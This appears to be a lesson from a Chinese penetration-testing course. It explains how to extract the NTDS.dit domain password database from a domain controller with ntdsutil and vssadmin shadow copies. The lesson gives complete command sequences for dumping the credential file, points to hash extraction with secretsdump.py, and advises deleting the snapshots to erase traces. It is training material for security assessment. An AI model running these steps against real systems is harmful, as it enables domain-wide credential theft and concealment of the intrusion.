# 网络安全入门：P65：2、Volume Shadow Copy 卷影副本技术详解 🛡️

![](img/ba6bbcdbfef0de436d1379c53bdd077d_1.png)

在本节课中，我们将学习在域环境下获取关键文件 `NTDS.dit` 的几种方法。`NTDS.dit` 是域控制器上存储所有域用户密码哈希值的数据库文件，是渗透测试和内网安全评估中的核心目标。我们将重点讲解利用 Windows 系统自带的卷影副本服务（Volume Shadow Copy Service, VSS）来提取该文件的技术。

上一节我们介绍了使用 `ntdsutil` 工具的交互式命令来操作卷影副本。本节中，我们来看看更高效、更贴近实战的非交互式命令用法，以及其他相关工具。

## 非交互式 `ntdsutil` 命令用法 🔧

![](img/ba6bbcdbfef0de436d1379c53bdd077d_3.png)

非交互式命令将交互式操作中的所有步骤整合为一条长命令，一次性执行，避免了在目标系统上逐步输入命令的繁琐和风险。其核心原理与交互式操作完全相同。

![](img/ba6bbcdbfef0de436d1379c53bdd077d_5.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_6.png)

以下是使用非交互式 `ntdsutil` 命令获取 `NTDS.dit` 文件的完整步骤：

**1. 查询当前系统快照**

![](img/ba6bbcdbfef0de436d1379c53bdd077d_8.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_9.png)

首先，我们需要查看系统中已存在的卷影副本（快照）。

![](img/ba6bbcdbfef0de436d1379c53bdd077d_11.png)

```cmd
ntdsutil snapshot "List All" quit quit
```

![](img/ba6bbcdbfef0de436d1379c53bdd077d_13.png)

**2. 创建新的卷影副本**

接着，我们为系统盘（通常是C盘）创建一个新的快照。

![](img/ba6bbcdbfef0de436d1379c53bdd077d_15.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_16.png)

```cmd
ntdsutil snapshot "Activate Instance NTDS" create quit quit
```

命令执行成功后，会返回新创建快照的ID（例如：`{GUID}`），请务必记录此ID。

**3. 挂载卷影副本**

![](img/ba6bbcdbfef0de436d1379c53bdd077d_18.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_19.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_20.png)

将上一步创建的快照挂载到一个可访问的路径（如 `C:\$SNAP_...`）。

```cmd
ntdsutil snapshot "mount {GUID}" quit quit
```
*注意：请将 `{GUID}` 替换为步骤2中获取的实际快照ID。*

**4. 复制 `NTDS.dit` 文件**

![](img/ba6bbcdbfef0de436d1379c53bdd077d_22.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_23.png)

快照挂载后，其文件系统即可访问。现在，从挂载的路径中复制出 `NTDS.dit` 文件。

![](img/ba6bbcdbfef0de436d1379c53bdd077d_25.png)

```cmd
copy C:\$SNAP_...\Windows\NTDS\ntds.dit C:\ntds_copy.dit
```
*注意：请将 `C:\$SNAP_...` 替换为实际的挂载路径。*

![](img/ba6bbcdbfef0de436d1379c53bdd077d_27.png)

**5. 卸载并删除卷影副本**

![](img/ba6bbcdbfef0de436d1379c53bdd077d_28.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_29.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_31.png)

操作完成后，为清理痕迹，需要卸载并删除创建的卷影副本。

![](img/ba6bbcdbfef0de436d1379c53bdd077d_33.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_34.png)

```cmd
ntdsutil snapshot "unmount {GUID}" "delete {GUID}" quit quit
```
*注意：请将 `{GUID}` 替换为实际的快照ID。*

## 简化的 `ntdsutil` 命令用法 ⚡

![](img/ba6bbcdbfef0de436d1379c53bdd077d_36.png)

除了上述分步命令，`ntdsutil` 还提供了一个更简洁的命令，可以直接将 `NTDS.dit` 文件及其关联的系统状态文件导出到指定目录。

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\hacker" quit quit
```
这条命令会在 `C:\hacker` 目录下生成两个子文件夹，其中就包含我们所需的 `ntds.dit` 文件和 `SYSTEM` 注册表文件，为后续的哈希提取和解密做好了准备。

![](img/ba6bbcdbfef0de436d1379c53bdd077d_38.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_40.png)

## 使用 `vssadmin` 管理工具 🛠️

![](img/ba6bbcdbfef0de436d1379c53bdd077d_42.png)

`vssadmin` 是 Windows 系统自带的卷影副本服务管理工具，在域环境中默认可用。它同样可以用于创建和操作快照。

以下是使用 `vssadmin` 的步骤：

![](img/ba6bbcdbfef0de436d1379c53bdd077d_44.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_45.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_46.png)

**1. 查询快照列表**

![](img/ba6bbcdbfef0de436d1379c53bdd077d_48.png)

```cmd
vssadmin list shadows
```

![](img/ba6bbcdbfef0de436d1379c53bdd077d_50.png)

**2. 创建新的卷影副本**

![](img/ba6bbcdbfef0de436d1379c53bdd077d_52.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_54.png)

```cmd
vssadmin create shadow /for=C:
```
命令执行后会返回新创建卷影副本的卷影副本ID（如 `Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`）。

![](img/ba6bbcdbfef0de436d1379c53bdd077d_56.png)

**3. 从快照中复制文件**

利用创建的快照路径，复制出 `NTDS.dit` 文件。

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds_vss.dit
```
*注意：请将路径中的 `HarddiskVolumeShadowCopy1` 替换为实际的卷影副本名称。*

**4. 删除卷影副本**

![](img/ba6bbcdbfef0de436d1379c53bdd077d_58.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_59.png)

```cmd
vssadmin delete shadows /for=C: /quiet
```

## 总结与要点回顾 📝

本节课中我们一起学习了在域环境下利用卷影副本技术获取 `NTDS.dit` 文件的三种主要方法：

![](img/ba6bbcdbfef0de436d1379c53bdd077d_61.png)

1.  **`ntdsutil` 交互式命令**：步骤清晰，适合学习原理，但实战中效率较低。
2.  **`ntdsutil` 非交互式命令**：将多步操作合并为单条命令，高效且隐蔽，是实战中的首选方法之一。
3.  **`vssadmin` 工具**：系统自带，命令直观，同样能有效完成快照创建和文件复制任务。

**核心要点**：
*   所有操作的前提是已经获得了域控制器的管理员权限。
*   操作完成后务必清理痕迹，卸载并删除创建的卷影副本。
*   获取到的 `ntds.dit` 文件需要与 `SYSTEM` 注册表文件配合，才能使用工具（如 `secretsdump.py`）成功提取域内所有用户的哈希值。

![](img/ba6bbcdbfef0de436d1379c53bdd077d_63.png)

![](img/ba6bbcdbfef0de436d1379c53bdd077d_64.png)

掌握这些技术对于理解内网横向移动、权限维持和域渗透测试至关重要。实践中还有许多其他工具和方法，但原理大多基于本节所讲的内容。